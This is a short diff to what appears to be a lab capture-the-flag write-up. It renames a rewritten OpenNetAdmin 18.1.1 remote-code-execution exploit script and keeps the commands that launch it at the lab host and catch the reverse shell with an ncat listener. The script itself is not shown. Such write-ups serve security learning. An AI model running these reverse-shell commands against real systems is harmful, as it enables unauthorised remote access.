@@ -19,8 +19,8 @@ PORT   STATE SERVICE VERSION
 
 Host is running OpenNetAdmin v18.1.1 which is vulnerable to a RCE exploit https://www.exploit-db.com/exploits/47691
 
-I re-wrote the exploit to spawn a reverse shell, can be found in exploit.sh
-    ./exploit.sh http://openadmin.htb/ona/ 10.10.14.x 2004
+I re-wrote the exploit to spawn a reverse shell, can be found in OpenNetAdmin_18.1.1_RCE.sh
+    ./OpenNetAdmin_18.1.1_RCE.sh http://openadmin.htb/ona/ 10.10.14.x 2004
 
 catch reverse shell with:
     ncat -lvnp 2004
